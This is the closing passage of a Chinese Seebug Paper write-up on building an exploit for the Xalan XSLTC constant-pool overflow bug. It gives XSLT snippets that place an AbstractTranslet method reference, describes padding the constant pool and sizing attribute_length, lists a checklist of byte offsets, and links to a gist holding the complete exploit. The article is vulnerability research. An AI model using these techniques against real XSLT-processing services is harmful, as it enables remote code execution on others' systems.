> JVM 会检查构造函数中 `return` 操作之前是否有调用 `super()` 方法，所以可以通过 `return`
> 前嵌入一个死循环即可解决这个问题

然而在看到邮件之前，找到了另一种解决方案，通过如下代码可提前引入 `AbstractTranslet.` 方法引用：

    
    
    <xsl:value-of select="at:new()" xmlns:at="org.apache.xalan.xsltc.runtime.AbstractTranslet"/>

可通过如下代码进行验证，可以看到 `AbstractTranslet.` 方法引用已经处于一个比较低位的常量池位置

    
    
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template>
        <xsl:value-of select="at:new()" xmlns:at="org.apache.xalan.xsltc.runtime.AbstractTranslet"/>
       <!-- 填充大量常量 <t t1='t2' t3='t4'... /> -->
    </xsl:template>
    </xsl:stylesheet>

![img](https://images.seebug.org/content/images/2022/09/09/1662693078000-44tbjyq.png-w331s)

但是对于 `org.apache.xalan.xsltc.runtime.AbstractTranslet` 类来说，由于是 `抽象类`，按理说不能调用
`new()` 方法进行实例化操作，所以在获取 `AbstractTranslet.` 方法引用这里卡了很久

但是从 `org.apache.xalan.xsltc.compiler.FunctionCall#findConstructors()` 中可以看到，通过
`反射` 的方式获取了构造方法

![img](https://images.seebug.org/content/images/2022/09/09/1662693078000-45zkpmd.png-w331s)

并且直到添加方法引用之前(`org.apache.xalan.xsltc.compiler.FunctionCall#translate`) 都不会检查
`XSLT 样式表中传入的类` 是否为 `抽象类`，因此通过这种方式解决了 `AbstractTranslet.` 方法引用加载的问题

![img](https://images.seebug.org/content/images/2022/09/09/1662693078000-46lbfmg.png-w331s)

![img](https://images.seebug.org/content/images/2022/09/09/1662693079000-47nzjqp.png-w331s)

### methods[1].attributes[2]

同样通过控制 `attribute_length` 长度吞噬掉剩余的垃圾字符，由于需要保留 `ClassFile` 尾部的 `SourceFile`
属性，所以长度设置为：`从 0x12345678 -> 保留尾部 10 个字节(attributes_count +
attributes)`，至此完整的利用就构造好了

    
    
    ClassFile {
        ...
        attribute_info attributes[attributes_count];         // 属性表
    }

![img](https://images.seebug.org/content/images/2022/09/09/1662693079000-48srtth.png-w331s)

## 0x07 CheckList

这里总结一下需要检查的一些项：

  1. `#262 (0x0106)` 需要指向 `Class` 引用 `com.sun.org.apache.xalan.internal.lib.ExsltStrings`
  2. 确认 `method[0].attribute_name_index` 指向正确的 `Utf8` 引用
  3. 确认 `access_flags` 位于常量池 `#1794` 项
  4. 确认 `常量池大小` 为 `0x0702` (可以 Debug `org.apache.bcel.classfile.ConstantPool#dump` 方法)
  5. 确认各个所需常量是否指向正确的常量池位置
  6. 确认 `methods[1].attributes[2].attribute_length` 是否为：从 `0x12345678` -> `保留末尾 10 个字节`

## 0x06 - 完整利用

  * gist：https://gist.github.com/thanatoskira/07dd6124f7d8197b48bc9e2ce900937f
  * 注意事项:  
由于文件名也会添加至常量池，为避免影响对其他常量位置造成变动，长度需保证一致(6)，`select -> abcdef`  
运行前最好删除已生成的 `*.class` 文件(文件内容发生变动则不用)

![img](https://images.seebug.org/content/images/2022/09/09/1662693080000-49aremt.png-w331s)

## 参考链接

  * [https://bugs.chromium.org/p/project-zero/issues/detail?id=2290&continueFlag=5f0a104405cabc4e1e6027013da73bfc](https://bugs.chromium.org/p/project-zero/issues/detail?id=2290&continueFlag=5f0a104405cabc4e1e6027013da73bfc)
  * <https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-4.html#jvms-4.4>
  * <https://en.wikipedia.org/wiki/List_of_Java_bytecode_instructions>
  * <https://docs.oracle.com/cd/E18283_01/appdev.112/e10708/adx_j_xslt.htm#i1028393>
  * <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSLT Injection/README.md>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1963/>

